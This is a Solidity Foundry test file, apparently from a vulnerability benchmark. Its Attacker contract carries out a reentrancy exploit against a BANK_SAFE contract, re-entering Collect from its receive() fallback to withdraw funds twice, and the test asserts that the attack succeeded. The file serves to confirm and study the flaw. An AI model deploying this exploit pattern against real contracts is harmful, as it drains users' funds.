
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE} from "../src/BANK_SAFE.sol";
import {LogFile} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {

    BANK_SAFE public bank;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        bank = new BANK_SAFE();
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max / 2);
        

        bank.SetMinSum(attackVal + 1);
        bank.SetLogFile(address(log));
        bank.Initialized();
        

        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValStored;

    constructor(address victimAddress) { 
        bank = BANK_SAFE(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackValStored = val;
        bank.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        bank.Collect(val);

        if (address(this).balance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            bank.Collect(attackValStored);
        }
    }
}
